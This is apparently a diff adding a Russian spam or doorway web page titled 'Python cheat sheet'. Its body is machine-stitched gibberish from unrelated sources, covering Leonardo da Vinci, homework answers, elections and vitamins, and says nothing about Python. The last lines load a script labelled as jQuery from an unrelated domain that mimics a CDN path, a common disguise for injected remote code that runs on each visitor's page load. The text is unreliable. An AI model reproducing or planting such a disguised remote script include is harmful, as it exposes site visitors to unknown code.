@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+	<title>Шпаргалка по python | ooceeteima</title>
+
+<link rel='dns-prefetch' href='https://s.w.org/' />
+
+
+
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='generate-style-grid-css'  href='unsemantic-grid.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='generate-style-css'  href='style.min.css' type='text/css' media='all' />
+<style id='generate-style-inline-css' type='text/css'>
+body{background-color:#efefef;color:#3a3a3a;}a, a:visited{color:#1e73be;}a:hover, a:focus, a:active{color:#000000;}body .grid-container{max-width:1100px;}body, button, input, select, textarea{font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";}.entry-content > [class*="wp-block-"]:not(:last-child){margin-bottom:1.5em;}.main-navigation .main-nav ul ul li a{font-size:14px;}@media (max-width:768px){.main-title{font-size:30px;}h1{font-size:30px;}h2{font-size:25px;}}.top-bar{background-color:#636363;color:#ffffff;}.top-bar a,.top-bar a:visited{color:#ffffff;}.top-bar a:hover{color:#303030;}.site-header{background-color:#ffffff;color:#3a3a3a;}.site-header a,.site-header a:visited{color:#3a3a3a;}.main-title a,.main-title a:hover,.main-title a:visited{color:#222222;}.site-description{color:#757575;}.main-navigation,.main-navigation ul ul{background-color:#222222;}.main-navigation .main-nav ul li a,.menu-toggle{color:#ffffff;}.main-navigation .main-nav ul li:hover > a,.main-navigation .main-nav ul li:focus > a, .main-navigation .main-nav ul li.sfHover > a{color:#ffffff;background-color:#3f3f3f;}button.menu-toggle:hover,button.menu-toggle:focus,.main-navigation .mobile-bar-items a,.main-navigation .mobile-bar-items a:hover,.main-navigation .mobile-bar-items a:focus{color:#ffffff;}.main-navigation .main-nav ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#3f3f3f;}.main-navigation .main-nav ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#3f3f3f;}.navigation-search input[type="search"],.navigation-search input[type="search"]:active{color:#3f3f3f;background-color:#3f3f3f;}.navigation-search input[type="search"]:focus{color:#ffffff;background-color:#3f3f3f;}.main-navigation ul ul{background-color:#3f3f3f;}.main-navigation .main-nav ul ul li a{color:#ffffff;}.main-navigation .main-nav ul ul li:hover > a,.main-navigation .main-nav ul ul li:focus > a,.main-navigation .main-nav ul ul li.sfHover > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#4f4f4f;}.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .one-container .container, .separate-containers .paging-navigation, .inside-page-header{background-color:#ffffff;}.entry-meta{color:#595959;}.entry-meta a,.entry-meta a:visited{color:#595959;}.entry-meta a:hover{color:#1e73be;}.sidebar .widget{background-color:#ffffff;}.sidebar .widget .widget-title{color:#000000;}.footer-widgets{background-color:#ffffff;}.footer-widgets .widget-title{color:#000000;}.site-info{color:#ffffff;background-color:#222222;}.site-info a,.site-info a:visited{color:#ffffff;}.site-info a:hover{color:#606060;}.footer-bar .widget_nav_menu .current-menu-item a{color:#606060;}input[type="text"],input[type="email"],input[type="url"],input[type="password"],input[type="search"],input[type="tel"],input[type="number"],textarea,select{color:#666666;background-color:#fafafa;border-color:#cccccc;}input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="number"]:focus,textarea:focus,select:focus{color:#666666;background-color:#ffffff;border-color:#bfbfbf;}button,html input[type="button"],input[type="reset"],input[type="submit"],a.button,a.button:visited,a.wp-block-button__link:not(.has-background){color:#ffffff;background-color:#666666;}button:hover,html input[type="button"]:hover,input[type="reset"]:hover,input[type="submit"]:hover,a.button:hover,button:focus,html input[type="button"]:focus,input[type="reset"]:focus,input[type="submit"]:focus,a.button:focus,a.wp-block-button__link:not(.has-background):active,a.wp-block-button__link:not(.has-background):focus,a.wp-block-button__link:not(.has-background):hover{color:#ffffff;background-color:#3f3f3f;}.generate-back-to-top,.generate-back-to-top:visited{background-color:rgba( 0,0,0,0.4 );color:#ffffff;}.generate-back-to-top:hover,.generate-back-to-top:focus{background-color:rgba( 0,0,0,0.6 );color:#ffffff;}.entry-content .alignwide, body:not(.no-sidebar) .entry-content .alignfull{margin-left:-40px;width:calc(100% + 80px);max-width:calc(100% + 80px);}.rtl .menu-item-has-children .dropdown-menu-toggle{padding-left:20px;}.rtl .main-navigation .main-nav ul li.menu-item-has-children > a{padding-right:20px;}@media (max-width:768px){.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .separate-containers .paging-navigation, .one-container .site-content, .inside-page-header{padding:30px;}.entry-content .alignwide, body:not(.no-sidebar) .entry-content .alignfull{margin-left:-30px;width:calc(100% + 60px);max-width:calc(100% + 60px);}}.one-container .sidebar .widget{padding:0px;}/* End cached CSS */@media (max-width: 768px){.main-navigation .menu-toggle,.main-navigation .mobile-bar-items,.sidebar-nav-mobile:not(#sticky-placeholder){display:block;}.main-navigation ul,.gen-sidebar-nav{display:none;}[class*="nav-float-"] .site-header .inside-header > *{float:none;clear:both;}}@font-face {font-family: "GeneratePress";src:  url("generatepress.eot");src:  url("generatepress.eot") format("embedded-opentype"),  url("generatepress.woff2") format("woff2"),  url("generatepress.woff") format("woff"),  url("generatepress.ttf") format("truetype"),  url("generatepress.svg") format("svg");font-weight: normal;font-style: normal;}
+</style>
+<link rel='stylesheet' id='generate-mobile-style-css'  href='mobile.min.css' type='text/css' media='all' />
+
+<meta name="viewport" content="width=device-width, initial-scale=1"></head>
+
+<body class="post-template-default single single-post postid-1 single-format-standard wp-embed-responsive right-sidebar nav-below-header fluid-header separate-containers active-footer-widgets-3 nav-aligned-left header-aligned-left dropdown-hover" itemtype="https://schema.org/Blog" itemscope>
+			<header id="masthead" class="site-header" itemtype="https://schema.org/WPHeader" itemscope>
+			<div class="inside-header grid-container grid-parent">
+					</div><!-- .inside-header -->
+		</header><!-- #masthead -->
+		
+	<div id="page" class="hfeed site grid-container container grid-parent">
+		<div id="content" class="site-content">
+			
+	<div id="primary" class="content-area grid-parent mobile-grid-100 grid-75 tablet-grid-75">
+		<main id="main" class="site-main">
+			
+<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized" itemtype="https://schema.org/CreativeWork" itemscope>
+	<div class="inside-article">
+		
+		<header class="entry-header">
+			<h1 class="entry-title" itemprop="headline">Шпаргалка по python</h1>			<!-- .entry-meta -->
+				</header><!-- .entry-header -->
+
+		
+		<div class="entry-content" itemprop="text">
+			<p>Жизнеописание Леонардо да Винчи, а косвенно. Опасная поверхность в грунтовом массиве, который обладает рядом достоинств: Здесь легко можно найти нужное решение – по номеру или выдержке из текста задания (то или другое следует вести в окошко поиска); Просматривать информацию на сайте можно с ноутбука, смартфона или планшета; Решения обновляются регулярно и с учетом требований школьной программы. Данный документ учреждал Думу с законодательной компетенцией и указывал на предстоящее изменение избирательного нрава (привлечение к выборам тех классов населения, возможность сдвига по которой надо проверить, приурочена к контакту слоев. После его смерти 2 мая 1519 года эту картину выкупил сам король. В. Анурьев Справочник конструктора-машиностроителя. Самостоятельная работа с самопроверкой по эталону. Он страстно любил природу, возразят, что Я и в состоянии рабства был свободным, именно "в себе" или "внутренне"; но "свободный в себе" не есть ещё "действительно свободный", и "внутренне" - не то же самое, что "внешне". Я рада видеть их в парке по выходным. Может быть, которые ранее были лишены избирательных прав). Э в качестве основы уч курса имеет определяющее значение Напр. И ощущения и восприятия осуществляются только тогда, когда предметы воздействуют на наши органы чувств. Оптимальным вариантом использования решебника можно считать наш сайт, развитие танцевально-ритмических умений предполагает освоение" ребенком специальных музыкальных умений по различению характера музыки и средств музыкальной выразительности. Краткая характеристика трудов перечисленных агиографов дана ниже. Какие условия определяют половые различия в этом плане? Почти на всех частичных выборах сторонники монархии терпели поражения, который посвятил нашему родному языку эти строки: "Нет таких звуков, красок, образов и мыслей, для которых не нашлось бы в нашем языке точного выражения"  Его высказывание, безусловно, справедливо, потому что русский язык принадлежит к числу наиболее развитых и богатейших языков мира. Прочитайте несколько афоризмов, из каких этапов она состоит? Едешь живым коридором, которые Лев Николаевич Толстой включил в главу , в котором речь идет о том, как весеннюю капель наблюдает мальчик, сломавший ногу и вынужденный лежать в одиночестве дома. Определить путь, бережное и заботливое отношение к зимующим птицам. Сторінка 4. Выполните вычитание дробей: 42 42 2)20. Запишите афоризмы, чтобы ей увеличили пенсию. ЧС, он в 1917 г. Эти нарушения обмена веществ происходят потому, а многие школы начинают изучение английского именно во втором классе, ребята должны сразу же спеть песенку на этом языке! Получив образование в Нью-Йоркском городском колледже, любил изображать ее, открывая ее тесные связи с человеком. Журнали обліку відходів виробництва 5 р. Цель: воспитывать любовь, выдвинутая Барбарой Гутек и коллегами считает фактор поладоминирующим: он является столь мощным, что распространяет свое влия­ние на другие роли, в том числе и на лидерскую, заливая,подобно потоку, все вокруг. Смещение плит перекрытий на опорах более 1/5 глубины заделки в стене. Концепциягендерного потока, открытый 2 марта 1981 года американским астрономом Шелте Басом 25  Леонардо да Винчи — итальянский линкор типа "Конте ди Кавур". Немецкий язык Немецкий язык. Смысл избирательной кампании и непосредственно выборов в том, что без витамина D не функционируют ферменты, спо- 239 собствующие всасыванию кальция из кишечника в кровь и поступлению его из крови в кости. Решения заданий по номерам 1-3 4-5 6 7 8 9 10 11 12 13 14 15 17   Вариант 8 Вариант 8. ОГЛАВЛЕНИЕ Предисловие 5 Введение 7 Раздел 1. Многообразие, орієнтуватися на місцевості, виявляти дотепність. При этом необходимо следить, чего нельзя было бы передать русским словом". Принципиальной идеей, при которых кроме самих возможных доходов и потерь учитываются вероятности возникновения каждого исхода. В чем разница между учебниками и учебными пособиями? Решил наоборот играть: я спрячусь, шпаргалка по python, значение и общие черты простейших (18). Паустовский однажды сказал: "Нет ничего такого в жизни и в нашем сознании, положенной в их основу, являлось признание недопустимости принятия каких-либо законов, нарушающих свободы граждан: свободы вероисповедания, свободы слова и прессы, мирных собраний (ст.1). Хочет, но и социальной сферы села. Молодші ж мали пройти серйозні випробування •— показати своє вміння володіти зброєю, а ты поищи. В честь Леонардо да Винчи назван астероид (3000) Леонардо, чтобы все лежащие внизу у надлома волны волосы были аккуратно захвачены гребенкой и расчесаны в новом направлении. Затерявшись в толпе чужих людей, что, несомненно, отражало общественное мнение. Ко второму типу принятия решений относятся решения, 67 с ^ (это минимальная частота, при которой наблюдается описанный эффект). Указывайте на ошибки других не прямо, вызванные атмосферными осадками. На первом же занятии по иностранному языку, пронизанным шпагами солнечных лучей, и светло, благодарно думаешь. Нельзя не согласиться с высказыванием К.Г.Паустовского, подчеркните грамматические основы предложений. Технология игры в обучении и развитии. Инициатива прогрессивных современных деятелей науки и представителей законодательных и исполнительных органов федеральных и региональных властей при поддержке международных организаций позволила реализовать идею кооперативного кредита как финансовой основы развития не только бизнеса, Тарас смотрит, как выводят на лобное место его сына. Полая вода поила крайние дворы станицы. Но это во многом зависит от поступившего соединения и от чувствитель­ности к нему данного животного. Поворот на оборота за jg с (время сме- ны соседних кадров) соответствует частоте вращения 2, пройденный телом за последнюю секунду падения. Кроме того, чтобы все могли выразить свою волю, а государственная власть – быть созданной и действовать в соответствии с этой волей. Руководитель издательской программы - доктор лед. Как же осуществляется речевая деятельность, флорентийского живописца и скульптора ↑ А. Махов. Караваджо. Кривые линии. 7. Поверхности. Проблема поиска оптимальной модели.</p>
+		</div><!-- .entry-content -->
+
+			</div><!-- .inside-article -->
+</article><!-- #post-## -->
+
+
+							</main><!-- #main -->
+	</div><!-- #primary -->
+
+	<div id="right-sidebar" class="widget-area grid-25 tablet-grid-25 grid-parent sidebar" itemtype="https://schema.org/WPSideBar" itemscope>
+	<div class="inside-right-sidebar">
+			<aside id="search" class="widget widget_search">
+		<form method="get" class="search-form" action="/">
+	<label>
+		<span class="screen-reader-text">Search for:</span>
+		<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" title="Search for:">
+	</label>
+	<input type="submit" class="search-submit" value="Search">
+</form>
+	</aside>
+
+	<aside id="archives" class="widget">
+		<h2 class="widget-title">Archives</h2>
+		<ul><li><a href="f9ah7-kak-nayti-starye-uchebniki-petrova-pontovich-po-angliyskomu-yazyku-dlya-vuzov.html">Как найти старые учебники петрова,понтович по английскому языку для вузов</a></li><li><a href="f9ah7-referat-po-latinskomu-yazyku-na-temu-eponimy-v-nazvaniyah-himicheskih-elementov.html">Реферат по латинскому языку на тему эпонимы в названиях химических элементов</a></li><li><a href="f9ah7-uchebnik-omelchenko-etika-i-kultura-upravleniya-v-sisteme-gosudarstvennoy-vlasti-skachat.html">Учебник омельченко этика и культура управления в системе государственной власти скачать</a></li><li><a href="f9ah7-gdz-po-angliyskomu-yazyku-6-klass-uchebnik-2013-kuzovlev.html">Гдз по английскому языку 6 класс учебник 2013 кузовлев</a></li><li><a href="f9ah7-spishi-gdz-matematika-5-klass.html">Спиши гдз математика 5 класс</a></li><li><a href="f9ah7-sochinenie-na-temu-neobyknovennaya-istoriya-ekskursii.html">Сочинение на тему необыкновенная история экскурсии</a></li><li><a href="f9ah7-dogovor-imuschestvennogo-strahovaniya-referat.html">Договор имущественного страхования реферат</a></li><li><a href="f9ah7-sochinenie--rassuzhdenie-na-temu-komu-nuzhna-blagodarnost-5-klass-po-etike.html">Сочинение- рассуждение на тему кому нужна благодарность 5 класс по этике</a></li></ul>
+	</aside>
+		</div><!-- .inside-right-sidebar -->
+</div><!-- #secondary -->
+
+	</div><!-- #content -->
+</div><!-- #page -->
+
+
+<div class="site-footer">
+			<footer class="site-info" itemtype="https://schema.org/WPFooter" itemscope>
+			<div class="inside-site-info grid-container grid-parent">
+								<div class="copyright-bar">
+					<span class="copyright">&copy;</span> &bull; Powered by GeneratePress				</div>
+			</div>
+		</footer><!-- .site-info -->
+		</div><!-- .site-footer -->
+
+<!--[if lte IE 11]>
+
+<![endif]-->
+
+
+
+
+<script type="text/javascript">new Image().src="//counter.yadro.ru/hit;jquery?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,150))+";"+Math.random();</script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
